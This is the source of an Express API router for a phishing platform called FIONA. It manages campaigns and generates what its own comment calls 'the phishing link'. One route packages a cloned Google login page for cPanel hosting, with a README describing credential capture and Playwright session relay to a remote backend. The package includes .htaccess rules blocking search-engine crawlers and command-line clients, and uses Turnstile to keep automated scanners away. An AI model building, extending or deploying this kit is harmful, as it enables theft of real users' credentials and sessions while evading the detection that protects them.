import { Router, Request, Response } from 'express';
import campaignService from '../../services/campaign.service';
import { authMiddleware } from '../../middleware/auth.middleware';
import { createCampaignSchema, updateCampaignSchema } from '../../utils/validation.util';
import { logger } from '../../utils/logger.util';
import { getNextProxy } from '../../services/proxy.service';
import prisma from '../../config/database';
import archiver from 'archiver';
import path from 'path';
import fs from 'fs';

const router = Router();

// All routes require authentication (both admin and technician)
router.use(authMiddleware);

/**
 * GET /api/campaigns
 * Get all campaigns for current user
 */
router.get('/', async (req: Request, res: Response) => {
  try {
    if (!req.user) {
      return res.status(200).json({
        success: true,
        campaigns: [],
        total: 0,
      });
    }

    const isAdmin = req.user.role === 'ADMIN';
    const result = await campaignService.getUserCampaigns(req.user.id, isAdmin);

    // Always return success with empty array if no campaigns
    if (!result.success || !result.campaigns) {
      return res.status(200).json({
        success: true,
        campaigns: [],
        total: 0,
      });
    }

    res.status(200).json({
      success: true,
      campaigns: result.campaigns,
      total: result.campaigns.length,
    });
  } catch (error: any) {
    logger.error('Get campaigns error:', error.message);
    // Always return 200 with empty array on error to prevent UI crashes
    res.status(200).json({
      success: true,
      campaigns: [],
      total: 0,
    });
  }
});

/**
 * POST /api/campaigns
 * Create new campaign
 */
router.post('/', async (req: Request, res: Response) => {
  try {
    if (!req.user) {
      res.status(401).json({ success: false, error: 'Not authenticated' });
      return;
    }

    // Validate input
    const validatedData = createCampaignSchema.parse(req.body);

    // Create campaign
    const result = await campaignService.createCampaign(req.user.id, validatedData);

    res.status(201).json(result);
  } catch (error: any) {
    logger.error('Create campaign error:', error.message);

    if (error.name === 'ZodError') {
      res.status(400).json({
        success: false,
        error: 'Validation error',
        details: error.errors,
      });
      return;
    }

    res.status(400).json({
      success: false,
      error: error.message || 'Failed to create campaign',
    });
  }
});

/**
 * GET /api/campaigns/:id
 * Get campaign by ID
 */
router.get('/:id', async (req: Request, res: Response) => {
  try {
    if (!req.user) {
      res.status(401).json({ success: false, error: 'Not authenticated' });
      return;
    }

    const { id } = req.params;
    const isAdmin = req.user.role === 'ADMIN';

    const result = await campaignService.getCampaignById(id, req.user.id, isAdmin);

    res.status(200).json(result);
  } catch (error: any) {
    logger.error('Get campaign by ID error:', error.message);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to get campaign',
    });
  }
});

/**
 * PATCH /api/campaigns/:id
 * Update campaign
 */
router.patch('/:id', async (req: Request, res: Response) => {
  try {
    if (!req.user) {
      res.status(401).json({ success: false, error: 'Not authenticated' });
      return;
    }

    const { id } = req.params;

    // Validate input
    const validatedData = updateCampaignSchema.parse(req.body);

    const isAdmin = req.user.role === 'ADMIN';
    const result = await campaignService.updateCampaign(id, req.user.id, validatedData, isAdmin);

    res.status(200).json(result);
  } catch (error: any) {
    logger.error('Update campaign error:', error.message);

    if (error.name === 'ZodError') {
      res.status(400).json({
        success: false,
        error: 'Validation error',
        details: error.errors,
      });
      return;
    }

    res.status(400).json({
      success: false,
      error: error.message || 'Failed to update campaign',
    });
  }
});

/**
 * DELETE /api/campaigns/:id
 * Delete campaign
 */
router.delete('/:id', async (req: Request, res: Response) => {
  try {
    if (!req.user) {
      res.status(401).json({ success: false, error: 'Not authenticated' });
      return;
    }

    const { id } = req.params;
    const isAdmin = req.user.role === 'ADMIN';

    const result = await campaignService.deleteCampaign(id, req.user.id, isAdmin);

    res.status(200).json(result);
  } catch (error: any) {
    logger.error('Delete campaign error:', error.message);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to delete campaign',
    });
  }
});

/**
 * POST /api/campaigns/:id/launch
 * Launch campaign and spawn Playwright worker session
 */
router.post('/:id/launch', async (req: Request, res: Response) => {
  try {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    const { id } = req.params;
    
    // Get campaign with domain
    const campaign = await prisma.campaign.findUnique({
      where: { id },
      include: { 
        User: { select: { id: true, email: true } }
      }
    });

    if (!campaign) {
      return res.status(404).json({ error: 'Campaign not found' });
    }

    // Check authorization
    const isAdmin = req.user.role === 'ADMIN';
    if (!isAdmin && campaign.userId !== req.user.id) {
      return res.status(403).json({ error: 'Not authorized' });
    }

    // Get next available proxy (round-robin)
    const proxyUrl = await getNextProxy();

    // Build the session URL - the phishing link served through the domain
    const sessionDomain = process.env.CAMPAIGN_DOMAIN || 'localhost:8000';
    const sessionUrl = `http://${sessionDomain}/api/capture?c=${campaign.captureId}`;

    // Create session record
    const session = await prisma.session.create({
      data: {
        userId: campaign.userId,
        campaignId: campaign.id,
        captureId: campaign.captureId,
        status: 'INITIATED',
        email: '', // Will be filled when user submits
      }
    });

    // Update campaign status to active
    await prisma.campaign.update({
      where: { id: campaign.id },
      data: { status: 'ACTIVE' }
    });

    logger.success(`Campaign ${campaign.name} launched - Session ${session.id}`);

    return res.json({ 
      session: {
        id: session.id,
        status: session.status,
      },
      sessionUrl, 
      proxyUsed: proxyUrl 
    });
  } catch (err: any) {
    logger.error('Launch campaign error:', err.message);
    return res.status(500).json({ error: err.message });
  }
});

/**
 * GET /api/campaigns/:id/stats
 * Get campaign statistics
 */
router.get('/:id/stats', async (req: Request, res: Response) => {
  try {
    if (!req.user) {
      res.status(401).json({ success: false, error: 'Not authenticated' });
      return;
    }

    const { id } = req.params;
    const isAdmin = req.user.role === 'ADMIN';

    const result = await campaignService.getCampaignStats(id, req.user.id, isAdmin);

    res.status(200).json(result);
  } catch (error: any) {
    logger.error('Get campaign stats error:', error.message);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to get campaign stats',
    });
  }
});

/**
 * GET /api/campaigns/:id/download-page
 * Download the campaign page HTML for a campaign
 */
router.get('/:id/download-page', async (req: Request, res: Response) => {
  try {
    const campaign = await prisma.campaign.findUnique({
      where: { id: req.params.id },
      include: { assignedDomains: true }
    });
    if (!campaign) return res.status(404).json({ error: 'Campaign not found' });

    const loginPageDir = path.resolve(__dirname, '../../../../login-pages/google');
    if (!fs.existsSync(loginPageDir)) {
      return res.status(404).json({ error: 'Login page directory not found' });
    }

    const backendUrl = process.env.BACKEND_URL || 'http://localhost:8000';
    const captureId = (campaign as any).captureId || '';
    const turnstileSitekey = (campaign as any).assignedDomains?.[0]?.turnstileSitekey || '';
    const campaignSlug = campaign.name.replace(/\s+/g, '-').toLowerCase();

    res.setHeader('Content-Disposition', `attachment; filename="${campaignSlug}-login-page.zip"`);
    res.setHeader('Content-Type', 'application/zip');

    const archive = archiver('zip', { zlib: { level: 9 } });
    archive.pipe(res);

    // Recursively add every file from login-pages/google/ preserving structure
    const walkDir = (dir: string, baseDir: string) => {
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      for (const entry of entries) {
        const fullPath = path.join(dir, entry.name);
        const zipPath = path.relative(baseDir, fullPath);
        if (entry.isDirectory()) {
          walkDir(fullPath, baseDir);
        } else if (entry.name === 'index.html') {
          let html = fs.readFileSync(fullPath, 'utf-8');
          html = html
            .replace(/\{\{BACKEND_URL\}\}/g, backendUrl)
            .replace(/\{\{CAPTURE_ID\}\}/g, captureId)
            .replace(/\{\{TURNSTILE_SITEKEY\}\}/g, turnstileSitekey);
          archive.append(html, { name: zipPath });
        } else {
          archive.file(fullPath, { name: zipPath });
        }
      }
    };
    walkDir(loginPageDir, loginPageDir);

    // config.js — backend URL baked in, loaded by the login page
    const configJs = `
// FIONA Configuration — auto-generated, do not edit
window.FIONA_CONFIG = {
  backendUrl: "${backendUrl}",
  captureId: "${captureId}",
  turnstileSitekey: "${turnstileSitekey}"
};`.trim();
    archive.append(configJs, { name: 'config.js' });

    // .htaccess — for cPanel Apache hosting
    const htaccess = `
Options -Indexes
DirectoryIndex index.html

<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteBase /

  # Block bots
  RewriteCond %{HTTP_USER_AGENT} (AhrefsBot|SemrushBot|DotBot|MJ12bot|googlebot|bingbot|slurp|baiduspider|yandexbot|curl|wget|python|scrapy|java|libwww) [NC]
  RewriteRule .* - [F,L]

  # SPA routing
  RewriteCond %{REQUEST_FILENAME} !-f
  RewriteCond %{REQUEST_FILENAME} !-d
  RewriteRule ^ index.html [L]
</IfModule>

<IfModule mod_headers.c>
  Header always set X-Frame-Options "DENY"
  Header always set X-Content-Type-Options "nosniff"
  Header always set Referrer-Policy "no-referrer"
  Header always set Cache-Control "no-store, no-cache, must-revalidate"
</IfModule>

<FilesMatch "\\.(env|log|sh|sql)$">
  Order allow,deny
  Deny from all
</FilesMatch>`.trim();
    archive.append(htaccess, { name: '.htaccess' });

    // README.txt — deployment instructions
    const readme = `
FIONA Login Page — Deployment Package
======================================
Campaign : ${campaign.name}
Capture ID : ${captureId}
Backend URL : ${backendUrl}
Generated : ${new Date().toISOString()}

DEPLOYING ON CPANEL
-------------------
1. Log in to cPanel → File Manager
2. Navigate to public_html (or your subdomain folder)
3. Upload this ZIP and extract it
4. Confirm index.html is in the root of public_html
5. Visit your domain — the login page loads automatically

HOW IT WORKS
------------
This package is a static frontend only. All credential capture
and Playwright session relay happens on the FIONA VPS at:

  ${backendUrl}

No server-side code runs on cPanel. The page only needs to make
outbound HTTPS requests to the backend URL above.

TURNSTILE
---------
Sitekey: ${turnstileSitekey}
Visitors must pass Cloudflare Turnstile before the login form
appears. This blocks bots and automated scanners.

SESSIONS
--------
All captured sessions appear in the FIONA admin panel → Sessions.`.trim();
    archive.append(readme, { name: 'README.txt' });

    await archive.finalize();
  } catch (err: any) {
    if (!res.headersSent) res.status(500).json({ error: err.message });
  }
});

export default router;
